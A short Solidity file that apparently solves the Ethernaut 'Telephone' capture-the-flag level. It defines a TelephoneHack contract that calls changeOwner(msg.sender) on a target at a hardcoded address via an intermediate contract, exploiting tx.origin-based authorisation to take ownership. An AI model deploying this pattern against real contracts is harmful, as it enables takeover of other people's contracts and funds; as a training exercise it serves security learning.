pragma solidity ^0.4.18;

contract Telephone {
  function changeOwner(address _owner) public{}
}

contract TelephoneHack{

    Telephone tInstance = Telephone(0xe0b02f897c0289fe6797f4ba8f38b15dfae1d160);
    function callHack() public {
        tInstance.changeOwner(msg.sender);
    }  

    function () public payable {

    }
}
